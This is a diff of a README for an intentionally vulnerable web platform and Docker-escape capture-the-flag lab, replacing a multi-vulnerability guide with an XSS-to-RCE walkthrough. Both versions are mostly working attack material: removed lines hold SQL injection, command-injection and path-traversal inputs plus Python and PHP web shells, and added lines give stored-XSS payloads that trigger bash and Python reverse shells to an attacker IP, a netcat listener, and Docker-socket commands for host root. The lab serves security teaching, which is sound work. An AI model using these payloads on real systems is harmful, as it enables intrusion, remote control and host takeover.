@@ -1,62 +1,44 @@
-# 🔓 Vulnerable Web Platform - Docker Escape Challenge
+# 🔓 XSS to RCE Challenge - Docker Escape
 
 ## ⚠️ WARNING
 **THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES!**
 
-- **DO NOT** deploy this in any production environment
-- **DO NOT** expose this to the internet
-- Use **ONLY** in isolated, controlled environments
-- For **educational and testing purposes ONLY**
+- **DO NOT** deploy in production
+- **DO NOT** expose to the internet
+- Use **ONLY** in isolated environments
+- For **educational purposes ONLY**
 
-## 📋 Overview
+## 📋 Challenge Overview
 
-This vulnerable web platform is designed for learning web exploitation and Docker escape techniques. It includes multiple intentional vulnerabilities that allow you to:
+This is a simplified vulnerable web platform designed to teach:
+1. **XSS (Cross-Site Scripting)** exploitation
+2. **XSS to RCE** (Remote Code Execution) escalation
+3. **Docker container escape** via exposed Docker socket
+4. **Privilege escalation** to root on host system
 
-1. Gain initial access through web vulnerabilities
-2. Execute commands on the server
-3. Escalate privileges
-4. Escape the Docker container
-5. Access the host system
+### 🎯 Objective
 
-## 🎯 Challenge Objectives
-
-### Level 1: Initial Access
-- [ ] Bypass login using SQL injection
-- [ ] Extract database contents
-- [ ] Gain admin access
-
-### Level 2: Code Execution
-- [ ] Execute commands via command injection
-- [ ] Upload a web shell
-- [ ] Read sensitive files
-
-### Level 3: Container Compromise
-- [ ] Confirm you're in a Docker container
-- [ ] Enumerate container environment
-- [ ] Find privilege escalation vectors
-
-### Level 4: Docker Escape
-- [ ] Identify Docker escape opportunities
-- [ ] Exploit misconfigured Docker setup
-- [ ] Access the host filesystem
-- [ ] Execute commands on the host system
+Exploit the vulnerabilities to become root on the host system and capture the flag located in `/root/flag.txt`.
 
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Docker and Docker Compose installed
-- Basic understanding of web vulnerabilities
-- Linux command line knowledge
+- Docker and Docker Compose
+- Basic understanding of XSS and Docker
 
-### Installation
+### Setup
 
-1. **Clone or navigate to the directory:**
+1. **Create the flag on your host system (before starting the container):**
    ```bash
-   cd vulnerable-platform
+   sudo su
+   echo "FLAG{congratulations_you_escaped_and_became_root}" > /root/flag.txt
+   chmod 600 /root/flag.txt
+   exit
    ```
 
-2. **Build and start the container:**
+2. **Start the challenge:**
    ```bash
+   cd vulnerable-platform
    docker-compose up -d --build
    ```
 
@@ -65,253 +47,157 @@ This vulnerable web platform is designed for learning web exploitation and Docke
    http://localhost:5000
    ```
 
-4. **Stop the container:**
+4. **Stop the challenge:**
    ```bash
    docker-compose down
    ```
 
-## 🔐 Default Credentials
+## 🎓 Challenge Walkthrough
 
-- **Admin:** `admin / admin123`
-- **User:** `user / password`
-- **Guest:** `guest / guest123`
+### Step 1: Identify XSS Vulnerability
 
-## 🐛 Vulnerabilities Included
+The message board allows users to post messages. Test for XSS:
 
-### 1. SQL Injection (Login & Search)
-**Location:** `/login`, `/search`
-
-**Description:** Direct string concatenation in SQL queries allows authentication bypass and data extraction.
-
-**Exploitation Examples:**
-```
-Username: admin' OR '1'='1' --
-Username: admin'--
-Search: ' UNION SELECT username, password, email, 1 FROM users--
-```
-
-### 2. Cross-Site Scripting (XSS)
-**Location:** `/post/<id>`, Comments
-
-**Types:**
-- Reflected XSS via URL parameters
-- Stored XSS in comments
-
-**Exploitation Examples:**
 ```html
 <script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
 ```
 
-### 3. Command Injection
-**Location:** `/ping`
+**Expected Result:** The alert should execute, confirming Stored XSS.
 
-**Description:** Unsanitized user input passed to shell commands.
+### Step 2: Exploit XSS for RCE
 
-**Exploitation Examples:**
-```
-127.0.0.1; whoami
-127.0.0.1 && cat /etc/passwd
-127.0.0.1 | ls -la /
-127.0.0.1; cat /flag.txt
-```
+There's a hidden `/execute` endpoint that accepts command execution. Create an XSS payload to interact with it:
 
-### 4. Unrestricted File Upload
-**Location:** `/upload`
-
-**Description:** No file type, size, or content validation.
-
-**Exploitation:** Upload web shells, reverse shells, or malicious files.
-
-### 5. Path Traversal
-**Location:** `/download`
-
-**Description:** No path sanitization in file download functionality.
-
-**Exploitation Examples:**
-```
-?file=../../../../etc/passwd
-?file=../../../../flag.txt
-?file=../../../../proc/self/cgroup
+```html
+<script>
+fetch('/execute', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'cmd=whoami'
+})
+.then(r => r.text())
+.then(data => {
+    document.body.innerHTML += '<div style="background:yellow;padding:20px;margin:10px;"><pre>' + data + '</pre></div>';
+});
+</script>
 ```
 
-### 6. Broken Access Control
-**Location:** `/admin`
+**Expected Result:** The output of `whoami` should appear on the page.
 
-**Description:** Authentication check relies only on session variables that can be manipulated.
+### Step 3: Get a Reverse Shell
 
-**Exploitation:** After SQL injection login, session may have admin privileges.
-
-### 7. Insecure Deserialization
-**Location:** `/serialize`
-
-**Description:** Python pickle deserialization without validation.
-
-**Exploitation:** Create malicious pickle payloads for code execution.
-
-## 🐳 Docker Escape Techniques
-
-The Docker setup includes multiple intentional misconfigurations:
-
-### 1. Privileged Mode
-```yaml
-privileged: true
-```
-**Impact:** Disables security features, grants full access to host devices.
-
-**Exploitation:**
+Set up a listener on your attacking machine:
 ```bash
-# From inside container
-fdisk -l  # List host disks
-mkdir /mnt/host
-mount /dev/sda1 /mnt/host
-ls /mnt/host
+nc -lvnp 4444
 ```
 
-### 2. Host Filesystem Mount
-```yaml
-volumes:
-  - /:/host
-```
-**Impact:** Entire host filesystem accessible at `/host`.
+Then post this XSS payload (adjust IP address to your host IP):
 
-**Exploitation:**
+```html
+<script>
+fetch('/execute', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'cmd=bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'
+});
+</script>
+```
+
+**Note:** Replace `YOUR_IP` with your actual IP address accessible from the container.
+
+Alternative Python reverse shell:
+```html
+<script>
+fetch('/execute', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'cmd=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'YOUR_IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"'
+});
+</script>
+```
+
+**Expected Result:** You should receive a shell connection.
+
+### Step 4: Verify Docker Environment
+
+Inside the shell, verify you're in a container:
+
 ```bash
-# From inside container
-ls /host
-cat /host/etc/passwd
-cat /host/root/.bash_history
-```
-
-### 3. Docker Socket Exposed
-```yaml
-volumes:
-  - /var/run/docker.sock:/var/run/docker.sock
-```
-**Impact:** Container can control Docker daemon.
-
-**Exploitation:**
-```bash
-# Install Docker CLI in container (if not present)
-apt-get update && apt-get install -y docker.io
-
-# List containers
-docker ps
-
-# Create privileged container with host filesystem
-docker run -v /:/host -it alpine sh
-
-# Access host filesystem
-chroot /host
-```
-
-### 4. Dangerous Capabilities
-```yaml
-cap_add:
-  - SYS_ADMIN
-  - SYS_PTRACE
-  - SYS_MODULE
-```
-**Impact:** Allows mounting, process tracing, and kernel module loading.
-
-### 5. Security Options Disabled
-```yaml
-security_opt:
-  - seccomp:unconfined
-  - apparmor:unconfined
-```
-**Impact:** Removes syscall and access control restrictions.
-
-## 🎓 Learning Path
-
-### Beginner Track
-1. Start with SQL injection on login page
-2. Try XSS in comments
-3. Use command injection to explore the container
-4. Upload a simple text file
-
-### Intermediate Track
-1. Extract all user credentials via SQL injection
-2. Gain admin access
-3. Execute complex commands
-4. Upload a web shell (Python/PHP)
-5. Identify Docker environment indicators
-
-### Advanced Track
-1. Enumerate Docker configuration
-2. Exploit privileged mode
-3. Access host filesystem via mount
-4. Use Docker socket to spawn privileged container
-5. Achieve full host compromise
-
-## 📚 Exploitation Cheat Sheet
-
-### Confirm Docker Environment
-```bash
-# Check if in container
 cat /proc/1/cgroup
 ls -la /.dockerenv
-cat /proc/self/mountinfo | grep docker
-
-# Check capabilities
-capsh --print
-
-# Check mounts
-mount | grep docker
-df -h
 ```
 
-### Basic Container Escape (Privileged + Host Mount)
+Check for Docker socket:
 ```bash
-# If /host is mounted
-chroot /host /bin/bash
-cat /host/root/flag.txt
+ls -la /var/run/docker.sock
 ```
 
-### Docker Socket Escape
+**Expected Result:** Docker socket should be present and accessible.
+
+### Step 5: Docker Escape via Socket
+
+Install Docker CLI in the container (if not present):
+
 ```bash
-# Install Docker CLI
 curl -fsSL https://get.docker.com -o get-docker.sh
 sh get-docker.sh
+```
 
-# Or use existing docker binary
+Or use existing Docker binary if available.
+
+List containers:
+```bash
 docker ps
-docker run -v /:/hostfs --privileged alpine sh -c "chroot /hostfs bash"
 ```
 
-### Web Shell Examples
-
-**Python Web Shell (webshell.py):**
-```python
-#!/usr/bin/env python3
-import os
-import subprocess
-from flask import Flask, request
-
-app = Flask(__name__)
-
-@app.route('/')
-def shell():
-    cmd = request.args.get('cmd', 'whoami')
-    result = subprocess.check_output(cmd, shell=True)
-    return f'<pre>{result.decode()}</pre>'
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+Create a privileged container with host filesystem mounted:
+```bash
+docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
 ```
 
-**Simple PHP Shell:**
-```php
-<?php system($_GET['cmd']); ?>
+**Expected Result:** You now have a root shell on the host system!
+
+### Step 6: Capture the Flag
+
+```bash
+cat /root/flag.txt
 ```
 
-## 🏁 Flags to Capture
+**Expected Output:**
+```
+FLAG{congratulations_you_escaped_and_became_root}
+```
 
-1. **FLAG{sql_injection_master}** - Found in database via SQL injection
-2. **FLAG{admin_access_granted}** - Displayed on admin panel
-3. **FLAG{unrestricted_upload_pwned}** - Shown after file upload
-4. **FLAG{you_are_inside_the_container}** - Located at `/flag.txt`
-5. **FLAG{docker_escape_successful_you_are_now_on_host}** - Found on host system
+🎉 **Congratulations! You've completed the challenge!**
+
+## 🔍 Technical Details
+
+### Vulnerability 1: Stored XSS
+- **Location:** Message board (`/` and `/post`)
+- **Cause:** User input rendered with `| safe` filter without sanitization
+- **Impact:** JavaScript execution in victim's browser
+
+### Vulnerability 2: RCE Endpoint
+- **Location:** `/execute` endpoint
+- **Cause:** Direct command execution via `subprocess` with `shell=True`
+- **Impact:** Arbitrary command execution on the container
+
+### Vulnerability 3: Docker Socket Exposed
+- **Location:** Docker configuration
+- **Cause:** `/var/run/docker.sock` mounted in container
+- **Impact:** Container can control Docker daemon and create privileged containers
+
+## 🛡️ Learning Objectives
+
+This challenge teaches:
+
+1. **XSS Exploitation:** How to identify and exploit Cross-Site Scripting vulnerabilities
+2. **XSS to RCE:** How XSS can be escalated to remote code execution
+3. **Reverse Shells:** How to establish reverse shell connections
+4. **Docker Architecture:** Understanding container isolation
+5. **Docker Socket Risk:** Why exposing Docker socket is dangerous
+6. **Container Escape:** Techniques to escape containerized environments
+7. **Privilege Escalation:** Path from container user to host root
 
 ## 🔧 Troubleshooting
 
@@ -321,53 +207,36 @@ docker-compose down
 docker-compose up --build
 ```
 
-### Can't access application
+### Can't get reverse shell
+- Check firewall rules
+- Verify IP address is correct
+- Try different reverse shell payloads
+- Use direct command execution first to debug
+
+### Docker socket not accessible
 ```bash
-# Check if container is running
-docker ps
-
-# Check logs
-docker logs vulnerable-platform
-
-# Verify port is not in use
-lsof -i :5000
+# Inside container
+ls -la /var/run/docker.sock
+docker ps  # Should work if socket is properly mounted
 ```
 
-### Permission issues
-```bash
-# Ensure Docker daemon is running
-sudo systemctl start docker
+## 📚 Additional Resources
 
-# Add user to docker group
-sudo usermod -aG docker $USER
-newgrp docker
-```
-
-## 📖 Additional Resources
-
-- OWASP Top 10: https://owasp.org/www-project-top-ten/
-- Docker Security Best Practices: https://docs.docker.com/engine/security/
+- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
+- Docker Security: https://docs.docker.com/engine/security/
 - Container Escape Techniques: Research papers and security blogs
-- Web Security Academy: https://portswigger.net/web-security
 
 ## ⚖️ Legal Disclaimer
 
-This platform is provided for **educational purposes only**. Users are responsible for:
-- Using this software legally and ethically
-- Ensuring proper isolation and security of their testing environment
-- Not using these techniques against systems without explicit authorization
-- Complying with all applicable laws and regulations
+This platform is for **educational purposes only**. 
+
+- ✅ Use only in isolated, controlled environments
+- ✅ Obtain proper authorization before testing
+- ✅ Follow ethical hacking principles
+- ❌ Do not use against systems without explicit permission
 
 **Unauthorized access to computer systems is illegal.**
 
-## 🤝 Contributing
-
-This is an educational project. Suggestions for additional vulnerabilities or improvements are welcome.
-
-## 📝 License
-
-This project is provided as-is for educational purposes. Use at your own risk.
-
 ---
 
-**Remember:** With great power comes great responsibility. Use this knowledge ethically! 🛡️
+**Remember: Learn responsibly and ethically!** 🛡️
